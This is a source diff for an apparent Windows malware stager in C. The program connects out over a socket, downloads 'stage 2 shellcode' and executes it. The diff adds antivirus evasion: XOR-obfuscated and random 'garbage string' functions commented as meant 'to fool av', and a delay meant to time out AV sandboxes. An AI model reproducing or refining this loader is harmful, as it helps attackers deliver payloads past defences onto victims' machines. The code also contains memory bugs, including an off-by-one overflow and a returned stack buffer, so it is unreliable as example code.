@@ -32,6 +32,19 @@ char* make_string2(const char *t)
 	return t2; 
 }
 
+//garbage string creation function XOR string with A
+char* make_string3(char *s)
+{
+	char *result = (char *)malloc(strlen(s));
+	unsigned int i;
+	char key = 'A';
+	for (i = 0; i < strlen(s); i++)
+	{
+		result[i] = s[i] ^ key;
+	}
+	result[i] = '\0';
+	return result;
+}
 //set up the socket
 void startsock() 
 { 
@@ -56,7 +69,6 @@ void killit(int maxnum)
 	return;
 }
 
-
 //garbage string creation function to fool av
 char* scratch_fill1()
 { 
@@ -78,11 +90,18 @@ char* scratch_fill2()
 { 
 	char scratch[200];
 	char scratch2[100]; 
-	strncpy(scratch, "There are no secrets in here. ", sizeof("There are no secrets in here. ")); 
-	strncpy(scratch2, "But then again maybe there are. ", sizeof("But then again maybe there are. ")); 
+	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	for (int i = 0; i < 100; ++i)
+	{
+		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+		scratch2[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	scratch[99] = '\0';
+	scratch2[99] = '\0';
+	
 	return make_string2(strcat(scratch, scratch2));
 }
-
 
 //get the stage 2 shellcode
 int getit(SOCKET sock, char * stage1, int stage0)
@@ -105,9 +124,33 @@ int getit(SOCKET sock, char * stage1, int stage0)
 //garbage string creation function to fool av
 char* scratch_fill3()
 { 
-	char scratch[100] = "this is a small string in all lower case."; 
+	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	char scratch[100];
+	for (int i = 0; i < 100; ++i)
+	{
+		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	scratch[99] = '\0';
 	char *scratch2 = strupr(scratch); 
 	return strlwr(scratch2); 
+}
+
+//garbage string creation function to fool av
+char* scratch_fill4()
+{
+	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	char scratch[100];
+	char *scratch2;
+	for (int i = 0; i < 100; ++i) 
+	{
+		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	scratch[99] = '\0';
+	scratch2 = make_string3(scratch);
+	scratch2[99] = '\0';
+	return scratch;
 }
 
 //make the connection to addr on port
@@ -137,56 +180,48 @@ SOCKET connect(char * addr, int port)
 void call_func(int run)   
 {
 	int i;
-	char * scratch1[SCRATCH_SIZE];
-	char * scratch2[SCRATCH_SIZE];
-	char * scratch3[SCRATCH_SIZE];
-	
+	char * scratch[SCRATCH_SIZE];
+
+	for (i = 0; i < SCRATCH_SIZE; ++i)
+		scratch[i] = (char *)malloc(rand() % 5000 + 1000);
+
 	switch (run)
 	{
 	case 1:
 		for (i = 0; i < SCRATCH_SIZE; ++i)
-			scratch1[i] = (char *)malloc(200 * sizeof(char));
-
-		for (i = 0; i<SCRATCH_SIZE; ++i)
-		{
-			strncpy_s(scratch1[i], 100, scratch_fill1(), 100);
-		}
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			free(scratch1[i]);
+			strcpy(scratch[i], scratch_fill1());
+		
 		break;
 
 	case 2:
 		for (i = 0; i < SCRATCH_SIZE; ++i)
-			scratch2[i] = (char *)malloc(rand() % 1000 + 1000);
-
-		for (i = 0; i<SCRATCH_SIZE; ++i)
-		{
-			strncpy_s(scratch2[i], 100, scratch_fill2(), 100);
-		}
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			free(scratch2[i]);
+			strcpy(scratch[i], scratch_fill2());
+		
 		break;
 
 	case 3:
 		for (i = 0; i < SCRATCH_SIZE; ++i)
-			scratch3[i] = (char *)malloc(rand() % 5000 + 1000);
+			strcpy(scratch[i], scratch_fill3());
 
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-		{
-			strncpy_s(scratch3[i], 100, scratch_fill3(), 100);
-		}
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			free(scratch3[i]);
 		break;
 
 	case 4:
 		killit(rand() % 5000);
 		break;
 
+	case 5:
+		for (i = 0; i < SCRATCH_SIZE; ++i)
+			strcpy(scratch[i], scratch_fill4());
+
+		break;
+
 	default:
 		killit(rand() % 5000);
 		break;
 	}
+	for (i = 0; i < SCRATCH_SIZE; ++i)
+		free(scratch[i]);
+
 }
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -199,8 +234,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	void(*stage2)();	//function pointer to execute stage 2 shellcode
 	int i;
 	
+	srand((unsigned)time(NULL));
 
-	
 killit(rand() % 5000 + 1000);  //run this first to timeout any AV sandbox.
 
 	startsock();
@@ -233,4 +268,3 @@ call_func(rand() % 5 + 1);
 call_func(rand() % 5 + 1);
 	return 0;
 }
-
